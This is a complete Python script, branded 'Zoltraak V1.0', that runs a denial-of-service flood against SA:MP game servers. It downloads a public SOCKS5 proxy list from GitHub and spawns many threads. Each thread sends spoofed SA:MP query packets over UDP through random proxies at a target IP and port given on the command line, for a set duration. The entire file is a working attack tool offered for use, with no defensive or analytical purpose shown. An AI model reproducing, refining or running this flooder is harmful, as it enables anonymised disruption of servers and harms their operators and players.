
import requests
import threading
import socket
import socks
import random
import sys
import struct
import time

proxy_api_urls = [
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt"
]

proxies = set()
for url in proxy_api_urls:
    response = requests.get(url)
    proxies.update(response.text.strip().replace('\r', '').split('\n'))

print("███████████████████████████")
print("███████▀▀▀░░░░░░░▀▀▀███████")
print("████▀░░░░░░░░░░░░░░░░░▀████")
print("███│░░░░░░░░░░░░░░░░░░░│███")
print("██▌│░░░░░░░░░░░░░░░░░░░│▐██")
print("██░└┐░░░░░░░░░░░░░░░░░┌┘░██")
print("██░░└┐░░░░░░░░░░░░░░░┌┘░░██")
print("██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██")
print("██▌░│██████▌░░░▐██████│░▐██")
print("███░│▐███▀▀░░▄░░▀▀███▌│░███")
print("██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██")
print("██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██")
print("████▄─┘██▌░░░░░░░▐██└─▄████")
print("█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████")
print("████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████")
print("█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████")
print("███████▄░░░░░░░░░░░▄███████")
print("██████████▄▄▄▄▄▄▄██████████")
print("███████Zoltraak V1.0███████")
print(f"█████████{len(proxies)} Proxy█████████")
print("███████Raknet SA:MP████████")
print("███████████████████████████")

target_ip = sys.argv[1]
target_port = int(sys.argv[2])
times = int(sys.argv[3])
totalthread = int(sys.argv[4])
start_time = time.time()
payload = b'SAMP' + socket.inet_aton(target_ip) + struct.pack('H', target_port) + b'i'

failure_counts = {proxy: 0 for proxy in proxies}
lock = threading.Lock()

def create_proxied_socket(proxy_host, proxy_port):
    s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
    s.set_proxy(socks.SOCKS5, proxy_host, proxy_port)
    return s

def worker():
    target = (target_ip, target_port)

    while time.time() - start_time < times:
        with lock:
            proxy = random.choice([p for p, count in failure_counts.items() if count < 10])

        proxy_host, proxy_port = proxy.split(":")
        udp = create_proxied_socket(proxy_host, int(proxy_port))

        try:
            udp.sendto(payload, target)
        except Exception as error:
            with lock:
                failure_counts[proxy] += 1
        else:
            with lock:
                failure_counts[proxy] = 0

while time.time() - start_time < times:
    while threading.active_count() >= totalthread:
        pass
    threading.Thread(target=worker).start()
